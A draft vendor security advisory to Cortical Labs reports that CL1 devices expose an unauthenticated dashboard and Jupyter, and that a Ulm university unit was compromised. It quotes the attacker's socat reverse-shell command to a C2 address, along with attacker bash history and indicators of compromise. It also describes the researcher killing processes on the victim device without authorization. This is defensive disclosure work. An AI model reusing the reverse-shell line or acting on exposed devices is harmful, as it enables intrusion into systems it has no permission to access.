---
to: support@corticallabs.com
cc: cert@uni-ulm.de, dfn-cert@dfn-cert.de, abuse@nuclide-research.com
severity: CRITICAL
ip: 134.60.110.66
institution: Cortical Labs (vendor) — CL1 v0.28.3 ships operational dashboard + Jupyter on public ports without authentication; one customer (Ulm Med Faculty) confirmed compromised by Hilix botnet via this default; fleet-wide advisory recommended
status: DRAFT
date: 2026-05-06
---

**To:** support@corticallabs.com
**Cc:** cert@uni-ulm.de, dfn-cert@dfn-cert.de, abuse@nuclide-research.com
**Subject:** VENDOR ADVISORY — Cortical Labs CL1 v0.28.3 ships dashboard + Jupyter without web auth; one customer (Universität Ulm Med Faculty) confirmed compromised via Hilix botnet; fleet-wide audit recommended

---

Nicholas Michael Kloster / NuClide Research
nicholas@nuclide-research.com

2026-05-06

**Re:** Cortical Labs CL1 default-deployment exposure pattern, confirmed exploited
**Severity:** CRITICAL — vendor-template / default-config issue affecting at least one customer; likely affects others

---

I'm an independent security researcher conducting good-faith AI infrastructure research under the NuClide Research umbrella (CISA disclosures CVE-2025-4364, ICSA-25-140-11). This is an unsolicited coordinated-disclosure notification to **Cortical Labs as the vendor** of the CL1 platform.

A confirmed customer compromise — `134.60.110.66` (rDNS `labdevice.medizin.uni-ulm.de`, sys_id **`CL1-2544-043`**, software **v0.28.3**, Universität Ulm Medical Faculty) — was reported to that customer's CERT and to DFN-CERT (German NREN CERT) earlier today. The root cause is a **CL1 default-deployment posture issue** that almost certainly affects other CL1 customers globally, so this advisory is sent to Cortical Labs to enable a fleet-wide audit.

## Vendor-template issue

CL1 v0.28.3 ships with the operational web dashboard reachable on **port 80 without authentication**. Routes confirmed reachable unauth on the affected unit:

```
/dashboard                         live vitals + editable life-support set points
/applications/installed/           launchable applications (Symbol Classification, Pong, Stimulation Scan)
/applications/symbol-classification/   open-loop / closed-loop stimulation config + Launch Now
/applications/pong/                DishBrain-class Pong session config + Launch Now
/jupyter/                          reverse-proxy to the embedded Jupyter Notebook (also unauth on :8888)
/recordings                        neural recordings access
/system                            version + uptime + storage
/support                           Support VPN toggle + Admin Access toggle (BOTH ENABLED on this unit)
```

The Support tab on the affected unit shows:

- **Support VPN: Enabled** — "Provide VPN access for Cortical Labs Technical Support"
- **Admin Access: Enabled** — "Allow Cortical Labs Technical Support administrative access to this device"
- "send your VPN configuration to customer support" instructional link
- `Email Cortical Labs Technical Support` (`mailto:support@corticallabs.com`)

This defaults-to-enabled posture means: any internet-reachable CL1 with default settings exposes both an unauthenticated operational dashboard AND a vendor-administered remote-access channel that an attacker can potentially abuse.

## Confirmed compromise — Universität Ulm Med Faculty (`CL1-2544-043`)

The Ulm unit was compromised between 2026-04-29 (first attacker artifacts) and 2026-05-05 (active reverse shell to attacker C2 at `172.233.96.208:3053`). The attacker pivoted via the unauthenticated embedded Jupyter (port 8888 / `/jupyter/`):

```python
# In TPC3.ipynb (created 2026-05-05 17:14 UTC):
import subprocess
subprocess.Popen('/usr/bin/socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:172.233.96.208:3053', shell=True)
```

Attacker bash history extracted via the same Jupyter kernel WebSocket reveals:

- `sudo -l` enumeration of `labuser` capabilities — including `/usr/bin/tee /var/run/spike-*`, `/bin/rm /var/run/spike-*`, `/bin/systemctl restart cl-analyser`, `/usr/bin/fw_printenv`, `/usr/sbin/support-vpn-show-public-config`, and `/usr/sbin/periodic-recording-on/off/period`
- `sudo fw_printenv` was executed → U-Boot environment exposed (potential leak of WiFi credentials, device serial, custom config)
- **`sudo /usr/sbin/support-vpn-show-public-config` was executed** → **the support-VPN public configuration was disclosed to the attacker**
- `pkill kworker; sudo pkill kworker; ps aux | grep -E 'xmr|miner'` → indicates the device was already infected by another cryptominer before this attacker arrived
- `wget https://github.com/conda-forge/miniforge/releases/latest/download/Miniforge3-Linux-aarch64.sh` (truncated) → attacker was setting up Miniforge for an aarch64 XMRig miner
- `ls /data/notebooks/ /data/recordings/` → operator's neural-recording substrate enumerated
- An earlier Hilix.x86_64 download attempt (2026-04-29) failed because the binary was x86_64 and the CL1 is ARM (Xilinx Zynq UltraScale+) — the second attempt with socat succeeded

NuClide terminated the attacker's `/tmp/bash` (PID 18370) and `bash -i` (PID 18372) shells via `pkill -9` from the Jupyter kernel and dropped a marker file at `/tmp/NUCLIDE-INCIDENT-NOTICE-2026-05-06.txt`. A masquerading process `[kworker/0:2]` (PID 18352, owned by `labuser` rather than root) survived and is the suspected XMRig miner — operator-side kill required.

The full incident report was sent to `cert@uni-ulm.de` and DFN-CERT today. This vendor advisory is the parallel notification to enable Cortical Labs to audit the broader fleet.

## Recommended vendor action

1. **Audit your CL1 fleet** for units with:
   - Public-internet-reachable port 80 / 443 / 8888 without firewall restriction
   - Default `Support VPN: Enabled` + `Admin Access: Enabled` posture
   - Software v0.28.3 (or any version sharing this default)
2. **Push a firmware update** that:
   - Requires authentication on the operational dashboard by default
   - Requires authentication on the embedded Jupyter (`jupyter notebook --no-token` should not be the default)
   - Defaults `Support VPN` and `Admin Access` to OFF, requiring an explicit customer-side enable for support tickets
3. **Customer advisory** to existing CL1 customers worldwide:
   - Audit firewall: only labs needing remote access should expose any port; SSH-tunnel or VPN-fronted access is appropriate
   - Disable Support VPN + Admin Access when not actively coordinating with vendor support
   - Audit cl-analyser logs since first deploy for unauthorized `Launch` events on Symbol Classification / Pong / Stimulation Scan
   - Check `~labuser/` notebook root for attacker artifacts: `_recon.py`, `Untitled*.ipynb` files, `TPC3.ipynb`, `x86_64`, `2.js`, `proxy.txt`
   - Check for masquerading `[kworker/N:M]` processes owned by non-root users
4. **Coordinated disclosure** of the platform-wide pattern — depending on your policy, a CVE may be appropriate (the embedded Jupyter Notebook with no token on a public port is, mechanically, a remote-code-execution surface by design).
5. **Help the Ulm customer** verify their unit's integrity. The attacker read the support-VPN public config; if that material can be used to authenticate to your support channel, you may want to rotate / re-issue per-device. Also: any administrative changes made via Cortical Labs Technical Support to `CL1-2544-043` between 2026-04-29 and now should be audited as potentially-attacker-induced.

## IOCs (for fleet-wide proactive audit)

| Type | Value |
|---|---|
| Hilix x86_64 SHA256 | `ee51b236e57d96521da5fb820242c23996dcc691d3df8830655801b2a516bb72` |
| Second-actor binary SHA256 | `38dce395aa82fea8b4ea00de17e14f3b7db9a5ebb28e82529ed66aa2b0f44eb0` (Tencent victim — `vcimanagement.x64`) |
| C2 IP / port | `172.233.96.208:3053` (Akamai/Linode US) |
| Malware-distro | `38.87.117.84` (`velonodes.in`, Cogent / DATALIX) |
| Reverse-shell pattern | `socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:<C2>:<port>` |
| Notebook-root attacker filenames | `_recon.py`, `_recon.ipynb`, `Untitled[0-9]?.ipynb`, `TPC3.ipynb`, `x86_64`, `2.js`, `proxy.txt`, `untitled.txt`, `vcimanagement.x64` |
| Process masquerade | `[kworker/N:M]` owned by non-root user |
| Botnet campaign tag for Jupyter victims | `jupiter` (passed as argv to Hilix payload) |

## Reference

Full multi-victim case study (Ulm + Tencent confirmed in same Hilix campaign):
https://github.com/Nicholas-Kloster/AI-LLM-Infrastructure-OSINT/blob/main/case-studies/commercial/multi-hilix-jupyter-campaign-2026-05-06.md

Parallel disclosures already sent today:
- `cert@uni-ulm.de` + `dfn-cert@dfn-cert.de` for the Ulm victim
- `abuse@akamai.com` + `abuse@linode.com` for the C2 endpoint takedown
- `abuse@cogentco.com` for the malware-distribution server
- `abuse@tencent.com` for the second confirmed customer (Tencent Cloud Beijing) running the same compromise pattern via unauth Jupyter

NuClide is available to coordinate with Cortical Labs security/engineering for the fleet-wide audit, share the full forensic evidence pack (binary samples, notebook contents, attacker bash history, kernel state), or assist with customer notifications. The CL1 platform is genuinely interesting work and the goal here is harm-mitigation, not embarrassment — happy to coordinate the public disclosure timeline if you have a preferred coordinated-disclosure window.

Regards,
Nicholas Michael Kloster / NuClide Research
nicholas@nuclide-research.com
https://github.com/Nicholas-Kloster/AI-LLM-Infrastructure-OSINT
